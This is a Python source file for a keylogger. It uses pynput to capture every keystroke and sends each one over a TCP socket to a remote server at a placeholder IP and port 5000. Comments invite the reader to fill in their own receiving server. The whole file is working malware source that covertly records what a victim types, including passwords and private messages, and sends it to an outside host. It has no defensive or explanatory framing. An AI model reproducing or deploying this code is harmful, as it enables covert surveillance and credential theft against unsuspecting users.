from pynput.keyboard import Listener
import socket
import os
import sys


# connection to your server
def create_connection():
    # Change to your server ip that should receive the log
    server_ip = 'xxx.xxx.x.xxx'
    # Set the port
    server_port = 5000

    # Creating a socket connection to the Server
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((server_ip, server_port))
        return client_socket
    except Exception as e:
        print(f"Error connecting to the server: {e}")
        return None


# Function to log the keystrokes on the client and send them to the server
def on_press(key):
    try:
        # connection to the server
        client_socket = create_connection()

        if client_socket:
            # Sending the data to the server
            client_socket.sendall(str(key).encode('utf-8'))
            print(f"Sent: {key}")
            client_socket.close()
    except Exception as e:
        print(f"Error while sending keystroke: {e}")


# Listener that waits for keypress
def start_listener():
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception as e:
        print(f"Error starting listener: {e}")


# Main function to run
if __name__ == "__main__":
    start_listener()

